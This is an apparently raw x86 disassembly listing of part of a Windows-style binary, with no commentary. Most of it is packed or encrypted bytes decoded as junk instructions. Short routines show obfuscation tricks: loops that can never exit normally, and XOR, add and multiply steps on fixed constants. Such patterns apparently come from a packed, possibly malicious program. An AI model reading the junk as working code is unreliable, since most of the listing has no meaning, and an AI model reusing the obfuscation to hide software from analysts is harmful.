  40592f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405930:	mov    ebp,0xa9f16c0b
  405935:	dec    edx
  405936:	frstor [ebp-0x2ff33ba6]
  40593c:	adc    dl,BYTE PTR [eax+0x17]
  40593f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405940:	and    al,0xe7
  405942:	aad    0xb5
  405944:	addr16 ret 
  405946:	add    DWORD PTR [eax-0x51],eax
  405949:	xchg   esi,eax
  40594a:	(bad)  
  40594b:	scas   al,BYTE PTR es:[edi]
  40594c:	dec    ebp
  40594d:	loopne 0x4058fd
  40594f:	xor    ecx,esp
  405951:	cmc    
  405952:	fisub  WORD PTR [ebx+0x7f592c94]
  405958:	dec    ecx
  405959:	mov    bh,0xc4
  40595b:	add    BYTE PTR [edx],al
  40595d:	push   0xffffff85
  40595f:	xchg   ebx,eax
  405960:	sbb    BYTE PTR [eax-0x2],ah
  405963:	xor    cl,BYTE PTR [ecx+eiz*1]
  405966:	adc    BYTE PTR [edx+esi*8-0xa],bh
  40596a:	pop    ebx
  40596b:	inc    edx
  40596c:	xchg   edi,eax
  40596d:	retf   
  40596e:	in     eax,dx
  40596f:	jmp    0x4792:0xb270cb89
  405976:	jns    0x4059f6
  405978:	gs sub eax,0xcb28b4de
  40597e:	es or  al,0x1d
  405981:	ss retf 0xa689
  405985:	or     cl,BYTE PTR [edx]
  405987:	mov    eax,ds:0x412155b0
  40598c:	lock call 0xded8:0xbbcf0415
  405994:	test   eax,0x3342d564
  405999:	jmp    0x405963
  40599b:	or     dh,BYTE PTR [ecx-0x5acd4cbe]
  4059a1:	inc    ecx
  4059a2:	ss fwait
  4059a4:	adc    ebp,DWORD PTR [esi]
  4059a6:	frstor [ebx+0x2]
  4059a9:	call   0x964f2301
  4059ae:	into   
  4059af:	mov    WORD PTR [edx],ds
  4059b1:	ss iret 
  4059b3:	xlat   BYTE PTR ds:[ebx]
  4059b4:	imul   eax,esi,0x76158df5
  4059ba:	pusha  
  4059bb:	add    dh,BYTE PTR [edi-0x67ebfc01]
  4059c1:	call   DWORD PTR [ecx]
  4059c3:	rol    bh,1
  4059c5:	add    bl,bl
  4059c7:	inc    esp
  4059c8:	pushf  
  4059c9:	and    edx,DWORD PTR [edi+edi*4]
  4059cc:	mov    ch,0x88
  4059ce:	mov    bh,BYTE PTR [esi+0x64ecb991]
  4059d4:	lds    eax,FWORD PTR [esi]
  4059d6:	pop    ss
  4059d7:	loop   0x4059ff
  4059d9:	je     0x405a33
  4059db:	adc    al,0x6
  4059dd:	mov    esi,0x6038d9b9
  4059e2:	cmp    ch,BYTE PTR [edx-0x61]
  4059e5:	adc    al,0x19
  4059e7:	xor    esp,DWORD PTR [edx-0x7385707e]
  4059ed:	dec    ecx
  4059ee:	sub    eax,0x86f50a50
  4059f3:	pop    ds
  4059f4:	repnz cmp eax,0xc77c03a2
  4059fa:	jg     0x405a60
  4059fc:	arpl   WORD PTR [ecx],si
  4059fe:	test   BYTE PTR [ecx+0x11],bl
  405a01:	test   al,0xd9
  405a03:	out    dx,eax
  405a04:	loop   0x405a08
  405a06:	or     bl,BYTE PTR [esi]
  405a08:	pop    ds
  405a09:	push   es
  405a0a:	pop    ebp
  405a0b:	sub    ebx,DWORD PTR [edx-0xbb68feb]
  405a11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a12:	jge    0x405a7c
  405a14:	ret    0xf70c
  405a17:	(bad)  
  405a18:	shr    BYTE PTR [eax],cl
  405a1a:	xchg   edx,eax
  405a1b:	and    ah,BYTE PTR [ebp-0x7b]
  405a1e:	xchg   DWORD PTR [eax],edi
  405a20:	(bad)  
  405a21:	and    BYTE PTR [edx-0x231b8ca6],bl
  405a27:	xor    DWORD PTR [eax],0x448fab2e
  405a2d:	jle    0x405a58
  405a2f:	and    DWORD PTR [edi-0x6dd0f724],esi
  405a35:	lods   eax,DWORD PTR ds:[esi]
  405a36:	pop    esi
  405a37:	popa   
  405a38:	outs   dx,DWORD PTR ds:[esi]
  405a39:	out    0xec,al
  405a3b:	in     al,0xdc
  405a3d:	ret    0xf5c3
  405a40:	sti    
  405a41:	and    cl,BYTE PTR [esi+0x4eece0a0]
  405a47:	inc    ebx
  405a48:	sbb    eax,DWORD PTR [edi+0x37]
  405a4b:	dec    edi
  405a4c:	mov    edi,0xc770a120
  405a51:	inc    ebp
  405a52:	clc    
  405a53:	xor    DWORD PTR [ebp-0x1d7e0764],eax
  405a59:	jnp    0x405ad4
  405a5b:	add    BYTE PTR [eax],al
  405a5d:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  405a64:	and    edx,edx
  405a66:	mov    eax,DWORD PTR [ebp-0x4]
  405a69:	sbb    ecx,DWORD PTR ds:0x42fd85
  405a6f:	push   esi
  405a70:	mov    esi,DWORD PTR [ebp-0x8]
  405a73:	and    DWORD PTR ds:0x42fd71,0x0
  405a7d:	jmp    0x405a8f
  405a82:	mov    edx,DWORD PTR ds:0x42fd71
  405a88:	inc    edx
  405a89:	mov    DWORD PTR ds:0x42fd71,edx
  405a8f:	cmp    DWORD PTR ds:0x42fd71,0x17
  405a96:	jae    0x405b0b
  405a9c:	cmp    DWORD PTR ds:0x42fd71,0x1d
  405aa3:	jne    0x405ab5
  405aa9:	push   DWORD PTR [ebp-0x24]
  405aac:	push   DWORD PTR [ebp-0x20]
  405aaf:	call   DWORD PTR ds:0x42e35b
  405ab5:	jmp    0x405a82
  405aba:	mov    DWORD PTR ds:0x42fd59,0x14
  405ac4:	cmp    DWORD PTR ds:0x42fd59,0x0
  405acb:	je     0x405b0b
  405ad1:	cmp    DWORD PTR ds:0x42fd59,0x16
  405ad8:	jne    0x405af7
  405ade:	push   DWORD PTR [ebp-0x14]
  405ae1:	push   0x2e3f
  405ae6:	push   DWORD PTR [ebp-0x18]
  405ae9:	push   DWORD PTR [ebp-0x18]
  405aec:	push   0x8cdb
  405af1:	call   DWORD PTR ds:0x42e5b7
  405af7:	xor    edx,edx
  405af9:	xor    edx,DWORD PTR ds:0x42fd59
  405aff:	dec    edx
  405b00:	mov    DWORD PTR ds:0x42fd59,edx
  405b06:	jmp    0x405ac4
  405b0b:	mov    edx,0x7510855
  405b10:	add    DWORD PTR ds:0x42fd51,edi
  405b16:	xor    eax,edx
  405b18:	and    DWORD PTR ds:0x42e777,ebx
  405b1e:	xor    esi,edx
  405b20:	mov    ecx,0x32729c
  405b25:	add    esi,ecx
  405b27:	add    eax,ecx
  405b29:	imul   eax,esi
  405b2c:	mov    esi,DWORD PTR [ebp+0xc]
  405b2f:	cmp    esi,eax
  405b31:	jne    0x405b4d
  405b37:	mov    eax,DWORD PTR [ebp-0x4]
  405b3a:	mov    esi,DWORD PTR [ebp-0x8]
  405b3d:	xor    eax,edx
  405b3f:	xor    esi,edx
  405b41:	add    eax,ecx
  405b43:	add    esi,ecx
  405b45:	imul   eax,esi
  405b48:	jmp    0x405e5b
  405b4d:	mov    eax,DWORD PTR [ebp+0xc]
  405b50:	mov    eax,DWORD PTR [eax+0x78]
  405b53:	mov    DWORD PTR [ebp+0xc],eax
  405b56:	mov    eax,DWORD PTR [ebp-0x4]
  405b59:	mov    esi,DWORD PTR [ebp-0x8]
  405b5c:	xor    eax,edx
  405b5e:	xor    esi,edx
  405b60:	add    eax,ecx
  405b62:	add    esi,ecx
  405b64:	imul   eax,esi
  405b67:	mov    esi,DWORD PTR [ebp+0xc]
  405b6a:	cmp    esi,eax
  405b6c:	mov    eax,DWORD PTR [ebp-0x4]
  405b6f:	je     0x405b3a
  405b75:	jmp    0x405e48
  405b7a:	xchg   DWORD PTR [ebx-0xdac0d75],edi
  405b80:	imul   esi,DWORD PTR gs:[eax+0x3],0xb290624d
  405b88:	lea    ebp,[esp+eax*4-0x558f8fce]
  405b8f:	jle    0x405c01
  405b91:	jo     0x405beb
  405b93:	xor    BYTE PTR [ecx+0x31],dh
  405b96:	add    al,0x6f
  405b98:	mov    al,0xc0
  405b9a:	mov    es,WORD PTR [esi+0x65]
  405b9d:	adc    bl,ch
  405b9f:	rcl    DWORD PTR [ebp+0x7d],0xb5
  405ba3:	(bad)  
  405ba4:	fsincos 
  405ba6:	scas   eax,DWORD PTR es:[edi]
  405ba7:	shr    BYTE PTR [eax-0x3aec85dc],0xc4
  405bae:	mov    esp,0xbe5ea16a
  405bb3:	not    DWORD PTR [eax+0x1c556781]
  405bb9:	scas   al,BYTE PTR es:[edi]
  405bba:	pop    edx
  405bbb:	bound  esp,QWORD PTR [edi+0x3]
  405bbe:	pop    eax
  405bbf:	inc    edi
  405bc0:	arpl   WORD PTR [ebx+0x29],di
  405bc3:	mov    al,ds:0xf391cde7
  405bc8:	into   
  405bc9:	stc    
  405bca:	cmp    eax,0x5a27bc25
  405bcf:	loope  0x405bdc
  405bd1:	inc    edi
  405bd2:	iret   
  405bd3:	xchg   esp,eax
  405bd4:	mov    eax,0xe2a3a3ed
  405bd9:	mov    BYTE PTR ds:0x653a2b45,dl
  405bdf:	leave  
  405be0:	daa    
  405be1:	xor    eax,0x480c68ed
  405be6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405be7:	add    al,0x4f
  405be9:	clc    
  405bea:	push   ebx
  405beb:	je     0x405c5c
  405bed:	fdivrp st(0),st
  405bef:	fs imul edi,ebp,0xffffffe4
  405bf3:	pop    ss
  405bf4:	xchg   esp,eax
  405bf5:	mov    esi,esi
  405bf7:	not    DWORD PTR [edi]
  405bf9:	mov    ch,0xf9
  405bfb:	in     al,dx
  405bfc:	(bad)  
  405bfd:	(bad)  
  405bfe:	lock pop es
  405c00:	jg     0x405c69
  405c02:	test   DWORD PTR [edi+0x168c3cc4],esi
  405c08:	jae    0x405c88
  405c0a:	aas    
  405c0b:	in     al,dx
  405c0c:	jp     0x405ba5
  405c0e:	in     al,0x86
  405c10:	sbb    eax,0xb35dc221
  405c15:	loope  0x405c69
  405c17:	pop    es
  405c18:	lahf   
  405c19:	sbb    ah,ch
  405c1b:	dec    ecx
  405c1c:	test   ch,dl
  405c1e:	pop    ss
  405c1f:	jae    0x405c08
  405c21:	scas   al,BYTE PTR es:[edi]
  405c22:	inc    eax
  405c23:	ret    
  405c24:	pop    ss
  405c25:	and    al,0x2d
  405c27:	(bad)  
  405c28:	shr    edx,cl
  405c2a:	adc    DWORD PTR [ebx+0x5135ea4e],edi
  405c30:	cs mov edx,0x335bf5a
  405c36:	data16 or al,0xd
  405c39:	add    ebp,DWORD PTR [ecx]
  405c3b:	xor    BYTE PTR [ebx+0x2f],dl
  405c3e:	not    eax
  405c40:	repz pop ebp
  405c42:	in     al,0x2a
  405c44:	mov    dh,0xf6
  405c46:	(bad)  
  405c47:	and    DWORD PTR [ebx],ebp
  405c49:	pop    es
  405c4a:	mov    esp,0x8483e904
  405c4f:	rcr    edx,cl
  405c51:	pop    esi
  405c52:	mov    WORD PTR [edx-0x4abef5f4],ss
  405c58:	jmp    0x405c91
  405c5a:	addr16 clc 
  405c5c:	loop   0x405c14
  405c5e:	push   ecx
  405c5f:	adc    bl,BYTE PTR [edx+0x30]
  405c62:	inc    eax
  405c63:	jg     0x405c4b
  405c65:	stos   BYTE PTR es:[edi],al
  405c66:	jmp    DWORD PTR [esi]
  405c68:	inc    edx
  405c69:	xchg   ecx,eax
  405c6a:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  405c6c:	pop    ecx
  405c6d:	mov    ch,0x7
  405c6f:	repz rcl BYTE PTR [ecx-0x4b4de7f5],cl
  405c76:	sbb    eax,0xa835f7e8
  405c7b:	lods   al,BYTE PTR ds:[esi]
  405c7c:	fbld   TBYTE PTR [esi]
  405c7e:	pop    ss
  405c7f:	loope  0x405c32
  405c81:	xchg   esi,eax
  405c82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c83:	cs loopne 0x405c7e
  405c86:	test   eax,eax
  405c88:	std    
  405c89:	mov    dl,0x2a
  405c8b:	sub    bh,cl
  405c8d:	mov    eax,ds:0xc355bfe
  405c92:	pop    ss
  405c93:	jb     0x405ca2
  405c95:	in     al,0xf9
  405c97:	out    dx,al
  405c98:	ds sub dl,dh
  405c9b:	adc    DWORD PTR [edi],edx
  405c9d:	xchg   esi,eax
  405c9e:	pop    esp
  405c9f:	pop    ebx
  405ca0:	xlat   BYTE PTR ds:[ebx]
  405ca1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ca2:	pop    ds
  405ca3:	cli    
  405ca4:	inc    BYTE PTR ds:0x375796a3
  405caa:	cmp    ecx,ebp
  405cac:	arpl   WORD PTR [edi-0x42],ax
  405caf:	jb     0x405c87
  405cb1:	cli    
  405cb2:	adc    eax,0xd2bf779
  405cb7:	pop    eax
  405cb8:	mov    ah,0x92
  405cba:	outs   dx,BYTE PTR ds:[esi]
  405cbb:	call   0xcd45459e
  405cc0:	scas   al,BYTE PTR es:[edi]
  405cc1:	mov    eax,gs
  405cc3:	int3   
  405cc4:	jg     0x405d3d
  405cc6:	mov    ?,WORD PTR [ebx]
  405cc8:	cmp    eax,0xb128fb14
  405ccd:	test   al,0xd3
  405ccf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405cd0:	gs xor dh,cl
  405cd3:	fcom   DWORD PTR [eax-0x7c]
  405cd6:	loop   0x405cf3
  405cd8:	out    dx,al
  405cd9:	popa   
  405cda:	pop    ecx
  405cdb:	jmp    0x405d35
  405cdd:	sub    esp,DWORD PTR [ebp-0x1]
  405ce0:	clc    
  405ce1:	bound  ebx,QWORD PTR [edx-0x181f3d1c]
  405ce7:	pop    esi
  405ce8:	imul   esp,DWORD PTR [esi+eiz*4-0x2],0x5e
  405ced:	adc    BYTE PTR [ebx],0x39
  405cf0:	cli    
  405cf1:	pop    ecx
  405cf2:	sahf   
  405cf3:	and    ebp,DWORD PTR [eax]
  405cf5:	test   BYTE PTR [ebx-0x2c],dh
  405cf8:	jle    0x405c7c
  405cfa:	cwde   
  405cfb:	mov    cl,0x4d
  405cfd:	lods   eax,DWORD PTR ds:[esi]
  405cfe:	inc    ecx
  405cff:	or     BYTE PTR [eax-0x79],ah
  405d02:	mov    al,ds:0x93ce5def
  405d07:	push   edi
  405d08:	inc    eax
  405d09:	in     eax,0xb4
  405d0b:	mov    ebx,esp
  405d0d:	cmp    cl,cl
  405d0f:	sub    ch,BYTE PTR [ecx]
  405d11:	adc    eax,0xf96ff3e1
  405d16:	and    ebp,0xfd912862
  405d1c:	test   al,0xdb
  405d1e:	or     eax,0x6a95f86e
  405d23:	das    
  405d24:	test   BYTE PTR [eax+0x4d],0x36
  405d28:	into   
  405d29:	xor    BYTE PTR [edi],ch
  405d2b:	jo     0x405d57
  405d2d:	pushf  
  405d2e:	fcomp  QWORD PTR [ebx]
  405d30:	pop    ebx
  405d31:	jp     0x405d7a
  405d33:	pop    es
  405d34:	and    BYTE PTR [esi-0x7e],bh
  405d37:	or     eax,0x3fa6c6d2
  405d3c:	cld    
  405d3d:	push   eax
  405d3e:	xor    DWORD PTR [esi+0x4b],ecx
  405d41:	pop    edi
  405d42:	bound  esp,QWORD PTR [ecx+0x62c565e1]
  405d48:	inc    edi
  405d49:	xor    eax,0xb49e7c93
  405d4e:	jecxz  0x405d06
  405d50:	shl    BYTE PTR [edx-0x756fdf8f],0x8e
  405d57:	aad    0x69
  405d59:	pop    ebx
  405d5a:	(bad)  
  405d5b:	cmp    eax,0x86308129
  405d60:	mov    esi,0x5b85e32
  405d65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d66:	call   0x1080ddb1
  405d6b:	jnp    0x405dba
  405d6d:	test   BYTE PTR [edi],bl
  405d6f:	lds    ecx,FWORD PTR [edx]
  405d71:	out    dx,eax
  405d72:	test   BYTE PTR [edi],ch
  405d74:	jae    0x405d25
  405d76:	jle    0x405dd0
  405d78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d7a:	fmul   st,st(1)
  405d7c:	loope  0x405dfb
  405d7e:	jp     0x405d03
  405d80:	sub    ch,dh
  405d82:	outs   dx,DWORD PTR ds:[esi]
  405d83:	xchg   bh,ch
  405d85:	outs   dx,BYTE PTR ds:[esi]
  405d86:	push   edi
  405d87:	(bad)  
  405d88:	xlat   BYTE PTR ds:[ebx]
  405d89:	dec    esp
  405d8a:	jp     0x405d99
  405d8c:	jo     0x405d39
  405d8e:	push   ecx
  405d8f:	retf   0xf517
  405d92:	je     0x405d36
  405d94:	push   cs
  405d95:	push   edi
  405d96:	push   eax
  405d97:	xchg   esi,eax
  405d98:	mov    esp,0xeb40880
  405d9d:	jmp    0xacffd9ed
  405da2:	repz or dl,al
  405da5:	pop    ebx
  405da6:	(bad)  
  405da7:	(bad)  
  405da8:	push   0x913200a5
  405dad:	pop    es
  405dae:	sbb    bh,BYTE PTR [ebx-0x76]
  405db1:	add    DWORD PTR [esi+0x15528393],edx
  405db7:	ret    0x40b2
  405dba:	dec    edx
  405dbb:	popf   
  405dbc:	sub    al,0xf8
  405dbe:	sahf   
  405dbf:	scas   eax,DWORD PTR es:[edi]
  405dc0:	xor    DWORD PTR [edx-0x5],edx
  405dc3:	shl    BYTE PTR [eax-0x6c2153ac],1
  405dc9:	fcomp  st(3)
  405dcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405dcc:	maskmovq mm2,(bad)
  405dcd:	not    DWORD PTR [eax]
  405dcf:	push   ebx
  405dd0:	mov    BYTE PTR [ebp-0x4f9918a0],0xcc
  405dd7:	iret   
  405dd8:	fs mov esi,gs
  405ddb:	test   cl,bl
  405ddd:	bswap  esp
  405ddf:	mov    dl,0x24
  405de1:	pop    esi
  405de2:	push   edx
  405de3:	add    al,0x6c
  405de5:	outs   dx,DWORD PTR ds:[esi]
  405de6:	inc    esp
  405de7:	dec    edi
  405de8:	jmp    0x405e1a
  405dea:	jae    0x405e27
  405dec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ded:	jae    0x405e1a
  405def:	(bad)  
  405df0:	mov    BYTE PTR [esi+0x53f46201],ah
  405df6:	pop    esi
  405df7:	and    al,ch
  405df9:	shl    BYTE PTR [esi],cl
  405dfb:	cdq    
  405dfc:	ficom  DWORD PTR ds:0xe9a8529e
  405e02:	std    
  405e03:	aas    
  405e04:	and    al,BYTE PTR [di+0x26]
  405e08:	mov    eax,?
  405e0a:	xchg   edi,eax
  405e0b:	imul   ebx,ebp,0x61
  405e0e:	push   ds
  405e0f:	adc    al,0xf1
  405e11:	aas    
  405e12:	mov    esp,0x5c2f3cba
  405e17:	sub    al,0xe1
  405e19:	aad    0x39
  405e1b:	xchg   ebx,eax
  405e1c:	mul    DWORD PTR [edx-0x6deb9365]
  405e22:	adc    eax,0x28617e85
  405e27:	mov    esi,0x7054ca81
  405e2c:	jbe    0x405e6e
  405e2e:	jae    0x405e02
  405e30:	xchg   edx,eax
  405e31:	outs   dx,BYTE PTR ds:[esi]
  405e32:	enter  0x2ffb,0xdb
  405e36:	pop    esi
  405e37:	inc    edx
  405e38:	(bad)  
  405e39:	fsub   QWORD PTR [edi+0x6437ff54]
  405e3f:	sub    eax,0xbbebc6ab
  405e44:	mov    esp,DWORD PTR [ebx-0x3dcc9792]
  405e4a:	add    eax,ecx
  405e4c:	mov    ecx,DWORD PTR [ebp+0xc]
  405e4f:	imul   eax,ecx
  405e52:	add    eax,DWORD PTR [ebp+0x8]
  405e55:	mov    DWORD PTR [ebp+0xc],eax
  405e58:	mov    eax,DWORD PTR [ebp+0xc]
  405e5b:	pop    esi
  405e5c:	leave  
  405e5d:	ret    0x8
  405e60:	push   ebp
  405e61:	mov    ebp,esp
  405e63:	push   ecx
  405e64:	add    DWORD PTR ds:0x42e78f,0x1508
  405e6e:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  405e75:	mov    eax,DWORD PTR [ebp-0x4]
  405e78:	mov    edx,DWORD PTR [ebp+0x10]
  405e7b:	adc    DWORD PTR ds:0x42e76f,0x4006
  405e85:	mov    ecx,0x7510855
  405e8a:	xor    DWORD PTR ds:0x42fd81,0x260
  405e94:	xor    eax,ecx
  405e96:	jmp    0x40605c
  405e9b:	fidiv  DWORD PTR [edx+0x7b]
  405e9e:	jle    0x405e33
  405ea0:	jne    0x405e7b
  405ea2:	jb     0x405e2d
  405ea4:	(bad)  
  405ea5:	(bad)  
  405ea6:	sub    al,0xaa
  405ea8:	test   al,0xb7
  405eaa:	inc    ecx
  405eab:	ds aas 
  405ead:	jo     0x405f1f
  405eaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405eb0:	jg     0x405f22
  405eb2:	jo     0x405e34
  405eb4:	imul   ebp,DWORD PTR [edx],0x33
  405eb7:	inc    edi
  405eb8:	ss ins BYTE PTR es:[edi],dx
  405eba:	jae    0x405f18
  405ebc:	jmp    0x4bc9:0x1fbe5c1a
  405ec3:	mov    bh,0x43
  405ec5:	mov    ah,0xd7
  405ec7:	jbe    0x405e86
  405ec9:	push   edi
  405eca:	jp     0x405efd
  405ecc:	lods   eax,DWORD PTR ds:[esi]
  405ecd:	add    al,0xdc
  405ecf:	jbe    0x405e71
  405ed1:	mov    bh,0xa
  405ed3:	mov    ebx,ecx
  405ed5:	or     eax,0xa823fda3
  405eda:	stos   DWORD PTR es:[edi],eax
  405edb:	jbe    0x405e60
  405edd:	das    
  405ede:	out    0x84,eax
  405ee0:	mov    ds:0x5ad18e45,eax
  405ee5:	daa    
  405ee6:	mov    esi,DWORD PTR [ebx-0x3a8460a2]
  405eec:	sub    ebx,DWORD PTR [ebp-0x638f71cf]
  405ef2:	mov    bh,0xf8
  405ef4:	xchg   BYTE PTR [ebx+ecx*8+0x3aa98691],al
  405efb:	jne    0x405eef
  405efd:	inc    ebx
  405efe:	sar    BYTE PTR [eax+0x24],1
  405f01:	cmp    eax,0xc5a5fc5d
  405f06:	or     ebp,DWORD PTR [ebp-0x7e1b3c79]
  405f0c:	or     DWORD PTR [esi+0x58bdb945],0x75
  405f13:	pop    ebp
  405f14:	aam    0x9
  405f16:	mov    al,0xae
  405f18:	call   0xadf06ea0
  405f1d:	sbb    eax,0xeeca5600
  405f22:	pop    ebp
  405f23:	xlat   BYTE PTR ds:[ebx]
  405f24:	es dec ebp
  405f26:	icebp  
  405f27:	jl     0x405ebb
  405f29:	jae    0x405f32
  405f2b:	(bad)  
  405f2d:	xchg   BYTE PTR [ecx+0x56],dl
  405f30:	jbe    0x405ec9
  405f32:	push   ebx
  405f33:	and    BYTE PTR [eax-0x5930dea1],al
  405f39:	mov    dl,0x3b
  405f3b:	adc    dl,BYTE PTR [esi-0x6]
  405f3e:	pop    ecx
  405f3f:	xchg   esp,eax
  405f40:	inc    ebp
  405f41:	popf   
  405f42:	or     edi,DWORD PTR [eax+ebx*1+0x66eb1243]
  405f49:	adc    dl,BYTE PTR [edi-0x451339e6]
  405f4f:	mov    ds:0x289df18,eax
  405f54:	repnz arpl WORD PTR [ebx+edx*8+0x3b],bp
  405f59:	test   al,0x1e
  405f5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f5c:	xchg   esp,eax
  405f5d:	mov    cl,BYTE PTR [ebp+edx*1+0x26aa649d]
  405f64:	mov    dl,0x16
  405f66:	bound  edi,QWORD PTR [ebp+0xa]
  405f69:	ins    DWORD PTR es:[edi],dx
  405f6a:	clc    
  405f6b:	in     al,dx
  405f6c:	push   cs
  405f6d:	enter  0x8429,0xe3
  405f71:	dec    ecx
  405f72:	rcr    DWORD PTR [ebx+0x4d21ce23],1
  405f78:	xchg   ebx,eax
  405f79:	iret   
  405f7a:	mov    eax,0x57d6fff8
  405f7f:	push   edx
  405f80:	sub    BYTE PTR [esi-0x19e5f508],dl
  405f86:	(bad)  
  405f88:	push   cs
  405f89:	lods   al,BYTE PTR ds:[esi]
  405f8a:	adc    dh,0x4e
  405f8d:	mov    ds:0xc721cce4,al
  405f92:	pop    ebx
  405f93:	inc    edx
  405f94:	push   es
  405f95:	in     al,dx
  405f96:	retf   0xbdbc
  405f99:	repz int3 
  405f9b:	(bad)  
  405f9c:	add    BYTE PTR [edx+0x15],bh
  405f9f:	neg    al
  405fa1:	sub    al,0x9d
  405fa3:	push   esp
  405fa4:	ss jmp 0x405ff2
  405fa7:	jmp    0x845bd186
  405fac:	inc    ebx
  405fad:	mov    ds,WORD PTR gs:[ebx]
  405fb0:	fwait
  405fb1:	out    0x64,al
  405fb3:	push   ecx
  405fb4:	push   edx
  405fb5:	jl     0x405ffe
  405fb7:	int3   
  405fb8:	test   al,0x59
  405fba:	xchg   ebx,eax
  405fbb:	sub    DWORD PTR ds:[edx-0x53],ebp
  405fbf:	repz popa 
  405fc1:	ja     0x40600b
  405fc3:	into   
  405fc4:	cmp    BYTE PTR [ecx+0x6f],bl
  405fc7:	mov    eax,DWORD PTR [esp+ebp*2]
  405fca:	ja     0x40603f
  405fcc:	out    dx,eax
  405fcd:	mov    bh,0x80
  405fcf:	xor    DWORD PTR [edi],esi
  405fd1:	sbb    eax,0xede97be0
  405fd6:	inc    eax
  405fd7:	out    dx,eax
  405fd8:	inc    esp
  405fd9:	call   0xba671bcb
  405fde:	scas   eax,DWORD PTR es:[edi]
  405fdf:	outs   dx,DWORD PTR ds:[esi]
  405fe0:	push   ds
  405fe1:	sar    DWORD PTR [ecx],cl
  405fe3:	hlt    
  405fe4:	out    dx,eax
  405fe5:	cmp    ecx,DWORD PTR [edi+0x9]
  405fe8:	dec    ecx
  405fe9:	sbb    ch,BYTE PTR [ebp+0xf]
  405fec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405fed:	iret   
  405fee:	rol    cl,1
  405ff0:	sub    BYTE PTR [ebp+0x79d0524b],0xf9
  405ff7:	int3   
  405ff8:	pusha  
  405ff9:	and    DWORD PTR [edx],ecx
  405ffb:	push   edx
  405ffc:	fs stc 
  405ffe:	xchg   esi,eax
  405fff:	xchg   ebx,eax
  406000:	mov    bl,0xb7
  406002:	mov    BYTE PTR [ebx],dl
  406004:	sbb    al,0x99
  406006:	mov    bl,0x68
  406008:	(bad)  
  40600a:	inc    eax
  40600b:	pop    ds
  40600c:	pop    ebx
  40600d:	arpl   WORD PTR [esi+edx*4+0x4],bp
  406011:	pop    ss
  406012:	xchg   esi,eax
  406013:	jno    0x405fc6
  406015:	cli    
  406016:	int3   
  406017:	push   ecx
  406018:	mov    edi,0x12f46877
  40601d:	xchg   ecx,eax
  40601e:	dec    DWORD PTR [ecx]
  406020:	sub    al,0xe1
  406022:	into   
  406023:	pusha  
  406024:	cmp    al,0xea
  406026:	sub    ebx,edx
  406028:	mov    DWORD PTR [ecx+0x77],edi
  40602b:	mov    al,ds:0xfd6dd6e8
  406030:	push   ebx
  406031:	hlt    
  406032:	lds    esp,FWORD PTR [ebx-0x22]
  406035:	and    eax,0x9653ca7b
  40603a:	or     dl,al
  40603c:	jbe    0x40604b
  40603e:	and    DWORD PTR [bx],edx
  406041:	push   ds
  406042:	ja     0x406044
  406044:	loope  0x405ffa
  406046:	dec    eax
  406047:	push   0xffffffbf
  406049:	call   0x78db:0x25b80314
  406050:	dec    edx
  406051:	inc    ebx
  406052:	jno    0x40603e
  406054:	push   ebp
  406055:	(bad)  [edi-0x3d6c8f63]
  40605b:	push   0x32729c05
  406060:	add    BYTE PTR [ecx+0x42fe060d],al
  406066:	add    ah,ah
  406068:	or     al,BYTE PTR [eax]
  40606a:	add    BYTE PTR [ecx+0xc458b02],cl
  406070:	xor    eax,ecx
  406072:	push   esi
  406073:	sbb    edx,DWORD PTR ds:0x42e198
  406079:	mov    esi,DWORD PTR [ebp+0x10]
  40607c:	or     DWORD PTR ds:0x42fdf6,edx
  406082:	mov    edx,0x32729c
  406087:	sbb    DWORD PTR ds:0x42fd71,0x42e19c
  406091:	add    eax,edx
  406093:	adc    DWORD PTR ds:0x42fd51,0x42e77b
  40609d:	mov    DWORD PTR [esi+0x4],eax
  4060a0:	sbb    eax,0x6979
  4060a5:	mov    eax,DWORD PTR [ebp+0x14]
  4060a8:	adc    DWORD PTR ds:0x42fe02,0x2335
  4060b2:	mov    esi,DWORD PTR [ebp+0x10]
  4060b5:	sub    DWORD PTR ds:0x42fd55,0x1c02
  4060bf:	mov    DWORD PTR [esi+0x8],eax
  4060c2:	or     eax,DWORD PTR ds:0x42fd85
  4060c8:	jmp    0x40628e
  4060cd:	out    dx,al
  4060ce:	hlt    
  4060cf:	arpl   WORD PTR [edx],dx
  4060d1:	popa   
  4060d2:	xchg   ecx,eax
  4060d3:	ins    DWORD PTR es:[edi],dx
  4060d4:	hlt    
  4060d5:	(bad)  
  4060d6:	pop    esp
  4060d7:	xor    eax,0x7103cc96
  4060dc:	mov    esi,0x70703e65
  4060e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060e2:	jg     0x406154
  4060e4:	jo     0x4060e3
  4060e6:	pop    edi
  4060e7:	addr16 add al,0x11
  4060ea:	mov    edx,0x3c5e709a
  4060ef:	cpuid  
  4060f1:	jno    0x4060bb
  4060f3:	out    dx,eax
  4060f4:	xor    al,0xd1
  4060f6:	push   edx
  4060f7:	sbb    al,0x97
  4060f9:	mov    al,ds:0x42525da3
  4060fe:	data16 (bad) 
  406100:	div    ebx
  406102:	push   cs
  406103:	imul   eax,DWORD PTR [edx],0xffffffce
  406106:	sbb    DWORD PTR [edi-0x38],0xffffffde
  40610a:	push   ds
  40610b:	xor    al,0x1d
  40610d:	das    
  40610e:	sbb    esi,DWORD PTR [ebp-0x5c]
  406111:	arpl   WORD PTR [ebx+0x46],di
  406114:	in     eax,0xf5
  406116:	cli    
  406117:	or     bl,BYTE PTR [ecx]
